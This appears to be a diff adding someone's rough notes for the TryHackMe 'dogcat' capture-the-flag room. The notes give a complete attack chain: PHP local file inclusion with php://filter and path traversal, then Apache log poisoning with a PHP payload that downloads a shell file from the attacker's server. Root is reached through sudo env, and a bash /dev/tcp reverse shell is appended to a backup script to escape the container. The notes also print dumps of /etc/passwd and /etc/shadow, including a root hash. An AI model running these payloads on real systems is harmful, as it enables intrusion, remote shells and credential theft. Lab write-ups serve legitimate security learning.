@@ -1,0 +1,222 @@
+https://www.youtube.com/watch?v=sN1pUl2BYco
+
+
+	paratmeter found*
+
+view=
+
+	path transversal*
+
+fatal error - must be some kind of filter, to bypass try php base64 encoded string
+
+http://10.10.202.236/?view=php://filter/read=convert.base64-encode/resource=dog/../index
+
+	server found to be vulnerable to lfi (local file inclusion)*
+
+	base64 string found*
+
+Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg== 
+
+	find decoded string in file -> (1base64decodedstring.txt)*
+
+
+
+
+
+	path transversal w/ param*
+
+
+10.10.155.240/?view=dog)../../../../../../etc/passwd
+
+Warning: include(dog)../../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
+
+Warning: include(): Failed opening 'dog)../../../../../../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
+
+	
+
+
+	path transversal with param, but with a specific ext param*
+
+http://10.10.155.240/?view=dog)../../../../../../etc/passwd&ext=
+
+Here you go!root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin 
+
+
+(get rphp.php ready)
+(Start Burp)
+
+(start python server in Dogcat directory)
+
+sudo python3 -m http.server 81
+
+(change browser proxy)
+
+(apache log poisoning)
+
+http://10.10.133.140/?view=dog)../../../../../../var/log/apache2/access.log&ext=
+
+
+(in burp repeater)
+
+(cahnge user agent to: )
+
+<?php file_put_contents('rphp.php',file_get_contents('http://10.2.26.235:81/rphp.php'))?>
+
+
+(response: view in poisoned_log1.txt)
+
+
+
+(on python server should get:)
+
+Serving HTTP on 0.0.0.0 port 81 (http://0.0.0.0:81/) ...
+127.0.0.1 - - [04/Aug/2020 12:46:58] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [04/Aug/2020 12:46:58] code 404, message File not found
+127.0.0.1 - - [04/Aug/2020 12:46:58] "GET /favicon.ico HTTP/1.1" 404 -
+127.0.0.1 - - [04/Aug/2020 12:47:02] "GET /rphp.php HTTP/1.1" 200 -
+
+
+(start netcat)
+
+nc -lvnp 4444
+
+(start rphp.php)
+
+http://10.10.155.240/rphp.php
+
+
+
+(necat)
+
+$cd var/www/
+
+$cat flag2_QMW7JvaY2LvK.txt
+
+THM{LF1_t0_RC3_aec3fb}
+
+
+$cd html
+
+$cat flag.php
+
+<?php
+$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
+?>
+
+
+$sudo -l
+
+Matching Defaults entries for www-data on 129de3a877bb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on 129de3a877bb:
+    (root) NOPASSWD: /usr/bin/env
+
+
+
+
+
+(CAN RUN /usr/bin/env)
+
+$sudo /usr/bin/env /bin/bash
+
+$cd /root
+
+$cat flag3.txt
+
+(to find the 4 flag, try:)
+
+$find / type -f flag4+ 0 2>/dev/null
+
+
+(looking for useful things)
+$cd /opt/backups
+
+$cat backup.sh
+
+(edit the file)
+
+$echo 'bash -i >& /dev/tcp/10.2.26.235/5555 0>&1' >> backup.sh
+
+
+(start a new listener)
+
+$nc -lvnp 4444
+
+
+(you should see)
+
+Listening on 0.0.0.0 4444
+Connection received on 10.10.92.241 57242
+bash: cannot set terminal process group (2743): Inappropriate ioctl for device
+bash: no job control in this shell
+root@dogcat:~# ls 
+
+$cat flag4.txt
+
+THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
+
+
+
+
+
+
+
+(shi+$ and gigs)
+
+$cat /etc/passwd                                                  
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+
+(nothing)
+
+
+
+$cat /etc/shadow
+root:$6$z1yY1sy4$pSe9WvGY6GR0DnjQfOkK6Z6KPzkwGqFEW9fRuGOkGYI3yfWbdBjpB6yKpO7M7FGF8Tbqt.3FXvXJ9c/T9c55O1:18331:0:99999:7:::
+daemon:*:18113:0:99999:7:::
+bin:*:18113:0:99999:7:::
+sys:*:18113:0:99999:7:::
+sync:*:18113:0:99999:7:::
+games:*:18113:0:99999:7:::
+man:*:18113:0:99999:7:::
+lp:*:18113:0:99999:7:::
+mail:*:18113:0:99999:7:::
+news:*:18113:0:99999:7:::
+uucp:*:18113:0:99999:7:::
+proxy:*:18113:0:99999:7:::
+www-data:*:18113:0:99999:7:::
+backup:*:18113:0:99999:7:::
+list:*:18113:0:99999:7:::
+irc:*:18113:0:99999:7:::
+gnats:*:18113:0:99999:7:::
+nobody:*:18113:0:99999:7:::
+systemd-network:*:18113:0:99999:7:::
+systemd-resolve:*:18113:0:99999:7:::
+syslog:*:18113:0:99999:7:::
+messagebus:*:18113:0:99999:7:::
+_apt:*:18113:0:99999:7:::
+lxd:*:18113:0:99999:7:::
+uuidd:*:18113:0:99999:7:::
+dnsmasq:*:18113:0:99999:7:::
+landscape:*:18113:0:99999:7:::
+pollinate:*:18113:0:99999:7:::
+sshd:*:18327:0:99999:7:::
+
